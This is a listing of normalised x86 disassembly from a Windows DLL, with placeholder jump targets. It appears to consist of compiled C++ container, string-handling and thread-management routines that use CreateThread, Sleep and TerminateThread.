test ecx ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov ecx [ ebp - 0x28 ]
mov esi [ ebp - 0x24 ]
mov ebx [ ebp - 0x10 ]
mov [ edi + 0x4 ] esi
mov [ edi ] ecx
mov ecx [ ebx + 0x18 ]
mov edx [ ecx ]
mov eax [ edx ]
call eax
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ebx [ ebp - 0x10 ]
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_10002030
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
xor eax eax
push 0xffffffff
push eax
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov ecx esi
mov [ esi ] ax
call sub_100019e0
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10002060
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
mov edi [ ebp + 0x8 ]
cmp edi eax
jae r-xdata
cmp eax [ esi + 0x8 ]
jne r-xdata
mov ecx [ esi ]
cmp ecx edi
ja r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push 0x1
mov ecx esi
call sub_10001ae0
sub edi ecx
sar edi 0x2
cmp eax [ esi + 0x8 ]
jne r-xdata
add [ esi + 0x4 ] 0x4
pop edi
pop esi
pop ebp
retn 0x4
mov ecx [ edi ]
mov [ eax ] ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push 0x1
mov ecx esi
call sub_10001ae0
mov ecx [ esi ]
mov edx [ ecx + edi * 4 ]
mov [ eax ] edx
add [ esi + 0x4 ] 0x4
pop edi
pop esi
pop ebp
retn 0x4
sub_100020d0
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx ecx
mov eax [ ebx + 0x38 ]
push esi
mov esi [ TerminateThread@IAT ]
push edi
mov edi [ CloseHandle@IAT ]
mov [ ebx ] r--data
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
push 0x0
push eax
call esi
mov eax [ ebx + 0x38 ]
push eax
call edi
mov edx [ ebx + 0x8 ]
cmp edx [ ebx + 0xc ]
je r-xdata
push 0x0
push eax
call esi
mov ecx [ ebx + 0x34 ]
push ecx
call edi
cmp [ ebx + 0x2c ] 0x0
mov [ ebp - 0x4 ] 0x0
jbe r-xdata
mov ecx [ ebx + 0xc ]
mov esi edx
cmp esi ecx
je r-xdata
lea ecx [ ebx + 0x1c ]
call sub_10001b40
mov eax [ ebx + 0x1c ]
push eax
call sub_10019ce4
xor edi edi
mov [ ebx + 0x1c ] edi
mov eax [ ebx + 0x8 ]
add esp 0x4
cmp eax edi
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebx + 0x1c ]
call sub_100018f0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov eax ecx
sub eax ecx
sar eax 0x2
lea edi [ eax * 4 ]
push edi
push ecx
push esi
call sub_1001a060
add esp 0xc
add edi esi
mov [ ebx + 0xc ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0xc ] edi
mov [ ebx + 0x10 ] edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_10019ce4
add esp 0x4
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov edi [ eax + ecx * 4 ]
mov eax [ ebx + 0x2c ]
test eax eax
je r-xdata
sub eax edi
mov ecx [ eax + 0x8 ]
mov edi [ edx + 0x8 ]
mov eax ecx
shr eax 0x2
and ecx 0x3
cmp edi eax
ja r-xdata
test edi edi
je r-xdata
mov edx [ ebx + 0x24 ]
inc [ ebx + 0x28 ]
add edx edx
add edx edx
cmp edx [ ebx + 0x28 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
cmp eax [ ebx + 0x2c ]
jb r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
dec eax
mov [ ebx + 0x2c ] eax
jne r-xdata
mov [ ebx + 0x28 ] 0x0
push edi
call sub_10019ce4
add esp 0x4
push eax
call sub_1001a3eb
add esp 0x4
mov [ ebx + 0x28 ] 0x0
sub_10002240
push ebp
mov ebp esp
xor eax eax
sub esp 0xc
cmp [ ecx + 0x2c ] eax
je r-xdata
mov esp ebp
pop ebp
retn
push esi
lea esi [ ecx + 0x1c ]
lea eax [ ebp - 0xc ]
push eax
mov ecx esi
call sub_100018f0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov eax [ eax + ecx * 4 ]
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
sub eax edi
mov ecx [ eax + 0x8 ]
mov eax ecx
push edi
mov edi [ edx + 0x8 ]
shr eax 0x2
and ecx 0x3
cmp edi eax
ja r-xdata
pop edi
pop esi
mov edi [ esi + 0x8 ]
inc [ esi + 0xc ]
add edi edi
add edi edi
cmp edi [ esi + 0xc ]
ja r-xdata
dec ecx
mov [ esi + 0x10 ] ecx
jne r-xdata
mov [ esi + 0xc ] 0x0
mov [ esi + 0xc ] 0x0
sub_100022c0
push ebp
mov ebp esp
sub esp 0x8
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax edi
sub eax ebx
sar eax 0x2
cmp eax 0x20
jle r-xdata
cmp eax 0x1
jle r-xdata
mov esi [ ebp + 0x10 ]
mov edi edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x14 ]
push 0x0
push edx
push edi
push ebx
call sub_100017c0
add esp 0x10
cmp eax 0x20
jle r-xdata
mov eax [ ebp + 0x14 ]
push eax
push edi
lea ecx [ ebp - 0x8 ]
push ebx
push ecx
call sub_10001bb0
mov ecx [ ebp - 0x8 ]
mov eax esi
cdq
sub eax edx
sar eax 0x1
mov esi eax
cdq
sub eax edx
sar eax 0x1
add esi eax
mov eax [ ebp - 0x4 ]
mov edx edi
sub edx eax
sub ecx ebx
and edx 0xfffffffc
and ecx 0xfffffffc
add esp 0x10
cmp ecx edx
jge r-xdata
mov edx edi
sub edx ebx
and edx 0xfffffffc
cmp edx 0x4
jle r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
push esi
push edi
push eax
call sub_100022c0
mov edi [ ebp - 0x8 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp - 0x8 ]
push edx
push esi
push eax
push ebx
call sub_100022c0
mov ebx [ ebp - 0x4 ]
jmp r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
push edi
push ebx
call sub_10001d60
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x14 ]
push 0x0
push 0x0
push eax
push edi
push ebx
call sub_10001710
add esp 0x14
test esi esi
jle r-xdata
mov eax edi
sub eax ebx
sar eax 0x2
add esp 0x10
cmp eax 0x20
jg r-xdata
sub_100023b0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
xor ecx ecx
mov [ esi ] cx
pop esi
pop ebp
retn
mov eax [ esi ]
push eax
call sub_10019ce4
add esp 0x4
sub_100023e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002bd8b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
xor ebx ebx
mov [ esi ] r--data
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
lea edi [ esi + 0x1c ]
push 0x8
mov [ ebp - 0x4 ] ebx
mov [ edi ] ebx
call sub_1001a818
add esp 0x4
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ebx
call sub_10019ba5
push r--data
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x20 ] r--data
call sub_1001a898
int3
mov [ edi ] eax
xor ecx ecx
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ edi ]
mov [ eax ] edi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x10 ] ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x34 ] ebx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_100024a0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebp
retn
nop
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_10019ce4
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
sub_100024e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002bdc1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
lea edi [ ebx + 0x7 ]
lea esp [ esp ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0x1c
add eax 0x1c
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
mov [ ebp + 0x8 ] eax
jmp r-xdata
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
push ebx
mov [ esi ] cx
push eax
mov ecx esi
call sub_100019e0
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
je r-xdata
sub_1000255d
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_1001a898
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x14 ]
lea ebx [ ebx ]
push esi
push ebx
call sub_100023b0
add esi 0x1c
add esp 0x8
cmp esi edi
jne r-xdata
sub_100025a0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push eax
add ecx 0xc
push ecx
mov ecx [ ebp + 0xc ]
push ecx
push edx
call sub_100024a0
add esp 0x10
pop ebp
retn 0x8
sub_100025c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002bde0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
mov ebx [ ebp + 0x8 ]
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
mov eax 0x0
shr edi 0x1f
add edi edx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp edi 0x9249249
jbe r-xdata
lea ecx [ esi + 0xc ]
push edi
call sub_10001270
lea ecx [ edi * 8 ]
sub ecx edi
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x8 ] edx
mov edx [ ebp + 0x8 ]
push edx
lea edx [ esi + 0xc ]
push edx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov ecx [ ebx + 0x4 ]
mov ebx [ ebx ]
push eax
push ecx
push ebx
mov [ ebp - 0x4 ] 0x0
call sub_100024e0
add esp 0x14
mov [ esi + 0x4 ] eax
push r--data
call sub_100190f4
sub_100026a0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0x4 ]
lea edx [ esi + 0xc ]
push edx
push ecx
push eax
call sub_100024a0
mov edx [ esi ]
push edx
call sub_10019ce4
add esp 0x14
sub_100026f0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov cx [ eax ]
mov [ esi ] cx
mov dl [ eax + 0x2 ]
mov [ esi + 0x2 ] dl
mov cl [ eax + 0x3 ]
add eax 0x4
mov [ esi + 0x3 ] cl
push eax
lea ecx [ esi + 0x4 ]
call sub_100025c0
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10002720
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0x8 ]
lea edx [ esi + 0x10 ]
push edx
push ecx
push eax
call sub_100024a0
mov edx [ esi + 0x4 ]
push edx
call sub_10019ce4
add esp 0x14
sub_10002770
push ebp
mov ebp esp
sub esp 0x14
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov edx [ eax + 0x14 ]
push edi
mov edi ecx
lea ecx [ ebp - 0x14 ]
push ecx
mov ecx esi
call edx
cmp [ eax ] 0x0
jne r-xdata
xor al al
mov ecx [ eax + 0x4 ]
cmp ecx [ eax + 0x8 ]
jne r-xdata
test bl bl
pop ebx
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0xc ]
lea ecx [ ebp - 0x4 ]
push ecx
push edx
push eax
call sub_100024a0
mov eax [ ebp - 0x10 ]
push eax
call sub_10019ce4
add esp 0x14
mov al 0x1
jmp r-xdata
mov ecx [ edi + 0x18 ]
test ecx ecx
je r-xdata
pop edi
xor al al
pop esi
mov esp ebp
pop ebp
retn 0x4
cmp al 0x1
mov eax [ ebp - 0x10 ]
push ebx
sete bl
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
test al al
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0xc ]
call eax
mov [ edi + 0x18 ] esi
pop edi
mov al 0x1
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10002800
push ebp
mov ebp esp
push 0xffffffff
push sub_1002be08
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
call edx
mov ecx [ esi + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ecx ]
mov eax [ eax + 0x14 ]
lea edx [ ebp - 0x48 ]
push edx
mov [ ebp - 0x18 ] 0x0
call eax
mov ebx [ ebp - 0x44 ]
mov ecx [ ebp - 0x40 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add edi edx
movzx edx [ ebp - 0x45 ]
imul edi edx
test ebx ebx
je r-xdata
mov [ ebp - 0x1c ] edi
mov eax [ ebp - 0x20 ]
mov edx [ ebp - 0x40 ]
push eax
lea ecx [ ebp - 0x38 ]
push ecx
push edx
push ebx
call sub_100024a0
mov eax [ ebp - 0x44 ]
push eax
call sub_10019ce4
add esp 0x14
mov ecx [ esi + 0x18 ]
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
call eax
test al al
jne r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
lea ecx [ ebp - 0x20 ]
push ecx
lea ecx [ esi + 0x1c ]
mov [ ebp - 0x14 ] eax
call sub_1000f6e0
jmp r-xdata
mov [ ebp - 0x18 ] 0x0
mov eax [ ebp - 0x18 ]
mov ecx eax
inc eax
mov [ ebp - 0x18 ] eax
cmp ecx [ ebp - 0x1c ]
jne r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
call edx
cmp [ ebp - 0x14 ] eax
jae r-xdata
mov ecx [ ebp - 0x14 ]
push ecx
call [ Sleep@IAT ]
mov edx [ esi + 0x18 ]
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
mov edi [ edx ]
mov edx [ eax ]
call edx
mov ecx [ esi + 0x18 ]
push eax
mov eax [ edi + 0x4 ]
call eax
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
add [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ esi + 0xc ]
sub eax [ esi + 0x8 ]
sar eax 0x2
cmp eax 0x1
jbe r-xdata
mov [ ebp - 0xd ] 0x0
test eax eax
je r-xdata
xor eax eax
lea ecx [ ecx ]
mov eax [ ebp - 0x58 ]
mov [ ebp - 0x44 ] edi
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x4 ] 0xffffffff
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x20 ]
push ecx
mov ecx [ ebp - 0x40 ]
lea edx [ ebp - 0x38 ]
push edx
push ecx
push eax
call sub_100024a0
mov edx [ ebp - 0x44 ]
push edx
call sub_10019ce4
add esp 0x14
mov ecx [ esi + 0xc ]
sub ecx [ esi + 0x8 ]
sar ecx 0x2
test bl bl
jne r-xdata
mov ecx [ ebp - 0x20 ]
push ecx
mov ecx [ ebp - 0x54 ]
lea edx [ ebp - 0x4c ]
push edx
push ecx
push eax
call sub_100024a0
mov edx [ ebp - 0x58 ]
push edx
call sub_10019ce4
add esp 0x14
movzx eax [ ebp - 0xd ]
inc eax
xor edx edx
div ecx
mov eax [ esi + 0x8 ]
movzx edx dl
mov ecx [ eax + edx * 4 ]
push ecx
mov ecx esi
call sub_10002770
mov ecx [ esi + 0x18 ]
mov edx [ ecx ]
mov edx [ edx + 0x14 ]
lea eax [ ebp - 0x34 ]
push eax
call edx
mov ebx [ ebp - 0x30 ]
mov ecx [ ebp - 0x2c ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
movzx ecx [ ebp - 0x31 ]
sar edx 0x4
mov edi edx
shr edi 0x1f
add edi edx
xor eax eax
imul edi ecx
cmp ebx eax
je r-xdata
mov al [ ebp - 0xd ]
inc al
mov [ ebp - 0xd ] al
movzx eax al
cmp eax ecx
jb r-xdata
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x1c ] edi
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x2c ]
push edx
lea eax [ ebp - 0x24 ]
push eax
push ecx
push ebx
call sub_100024a0
mov edx [ ebp - 0x30 ]
push edx
call sub_10019ce4
add esp 0x14
xor eax eax
mov edx [ esi + 0x8 ]
mov edi [ edx + eax * 4 ]
mov ecx [ esi + 0x18 ]
mov eax [ ecx ]
mov eax [ eax + 0x14 ]
lea edx [ ebp - 0x5c ]
push edx
call eax
mov ebx eax
mov edx [ edi ]
mov edx [ edx + 0x14 ]
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x0
call edx
mov ax [ eax ]
cmp ax [ ebx ]
mov eax [ ebp - 0x44 ]
sete bl
xor edi edi
cmp eax edi
je r-xdata
jmp r-xdata
sub_10002a80
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx ecx
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x8 ]
push esi
sar eax 0x2
push edi
mov [ ebp - 0x1 ] 0x0
test eax eax
je r-xdata
pop edi
pop esi
xor al al
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov edi [ ebp - 0x10 ]
cmp esi edi
je r-xdata
movzx edx [ ebp - 0x1 ]
mov eax [ ebx + 0x8 ]
mov ecx [ eax + edx * 4 ]
push ecx
mov ecx ebx
call sub_10002770
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov al [ ebp - 0x1 ]
mov ecx [ ebx + 0xc ]
sub ecx [ ebx + 0x8 ]
inc al
mov [ ebp - 0x1 ] al
movzx eax al
sar ecx 0x2
cmp eax ecx
jb r-xdata
push esi
call sub_10019ce4
add esp 0x4
lea esp [ esp ]
mov ecx [ ebx + 0x8 ]
mov ecx [ ecx + eax * 4 ]
mov edx [ ecx ]
mov edx [ edx + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call edx
mov cx [ ebp + 0x8 ]
cmp [ eax ] cx
mov esi [ ebp - 0x14 ]
sete [ ebp - 0x2 ]
test esi esi
je r-xdata
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
add esi 0x1c
cmp esi edi
jne r-xdata
mov edx [ esi ]
push edx
call sub_10019ce4
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov esi [ ebp - 0x14 ]
sub_10002b60
push ebp
mov ebp esp
push 0xffffffff
push sub_1002be38
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x14 ]
lea edx [ ebp - 0x34 ]
push edx
call eax
mov esi eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov edx [ edx + 0x14 ]
lea eax [ ebp - 0x20 ]
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call edx
mov cl [ esi + 0x2 ]
cmp cl [ eax + 0x2 ]
mov eax [ ebp - 0x1c ]
setb bl
cmp eax edi
je r-xdata
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] edi
cmp eax edi
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x18 ]
lea ecx [ ebp - 0x10 ]
push ecx
push edx
push eax
call sub_100024a0
mov eax [ ebp - 0x1c ]
push eax
call sub_10019ce4
add esp 0x14
mov al bl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x2c ]
lea edx [ ebp - 0x24 ]
push edx
push ecx
push eax
call sub_100024a0
mov edx [ ebp - 0x30 ]
push edx
call sub_10019ce4
add esp 0x14
sub_10002c20
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
mov eax [ esi + 0xc ]
sub eax [ esi + 0x8 ]
test eax 0xfffffffc
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
push ecx
mov ecx esi
call sub_10002770
test al al
je r-xdata
push edi
mov edi [ CreateThread@IAT ]
lea edx [ ebp - 0x4 ]
push edx
push 0x0
push esi
push sub_10001100
push 0x0
push 0x0
call edi
mov [ esi + 0x38 ] eax
test eax eax
je r-xdata
pop edi
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push esi
push sub_10001080
push 0x0
push 0x0
call edi
mov [ esi + 0x34 ] eax
sub_10002c90
push ebp
mov ebp esp
push 0xffffffff
push sub_1002be68
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov eax [ edi + 0xc ]
sub eax [ edi + 0x8 ]
xor ebx ebx
sar eax 0x2
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xd ] bl
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
mov edi [ edi + 0x8 ]
mov edx eax
sub edx edi
push sub_10002b60
sar edx 0x2
push edx
push eax
push edi
call sub_100022c0
mov esi [ ebp + 0xc ]
add esp 0x10
cmp esi ebx
je r-xdata
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
cmp [ ebp - 0xe ] 0x0
je r-xdata
mov ebx [ ebp - 0x20 ]
cmp esi ebx
je r-xdata
push esi
call sub_10019ce4
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov al [ ebp - 0xd ]
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x8 ]
inc al
mov [ ebp - 0xd ] al
movzx eax al
sar ecx 0x2
mov [ ebp - 0x14 ] eax
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov esi [ eax + ecx * 4 ]
mov dx [ ebp + 0x8 ]
sub esp 0x14
mov eax esp
mov [ eax ] dx
mov cl [ ebp + 0xa ]
mov [ eax + 0x2 ] cl
mov dl [ ebp + 0xb ]
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x14 ] esp
push ecx
lea ecx [ eax + 0x4 ]
mov [ eax + 0x3 ] dl
call sub_100025c0
mov edx [ esi ]
mov eax [ edx + 0x18 ]
mov ecx esi
call eax
push esi
call sub_10019ce4
add esp 0x4
xor ebx ebx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] cx
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_10019ce4
add esp 0x4
mov ecx [ edi + 0x8 ]
mov edx [ ebp - 0x14 ]
mov ecx [ ecx + edx * 4 ]
mov eax [ ecx ]
mov eax [ eax + 0x14 ]
lea edx [ ebp - 0x28 ]
push edx
call eax
mov cx [ eax ]
cmp cx [ ebp + 0x8 ]
mov esi [ ebp - 0x24 ]
sete [ ebp - 0xe ]
cmp esi ebx
je r-xdata
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] dx
add esi 0x1c
cmp esi ebx
jne r-xdata
mov eax [ esi ]
push eax
call sub_10019ce4
add esp 0x4
mov esi [ ebp + 0xc ]
mov esi [ ebp - 0x24 ]
sub_10002e50
push ebp
mov ebp esp
push 0xffffffff
push sub_1002be90
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x0
call edx
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10002f40
push esi
mov esi [ ecx + 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push esi
call sub_10019ce4
add esp 0x4
push eax
call sub_1001a3eb
add esp 0x4
sub_10002f80
movzx eax [ ecx + 0x40 ]
push esi
mov esi [ ecx + 0x34 ]
sub esi [ ecx + 0x30 ]
inc eax
sar esi 0x2
xor edx edx
div esi
pop esi
mov [ ecx + 0x40 ] dl
mov ecx [ ecx + 0x30 ]
movzx eax dl
mov eax [ ecx + eax * 4 ]
retn
sub_10002fb0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0x3fffffff
ja r-xdata
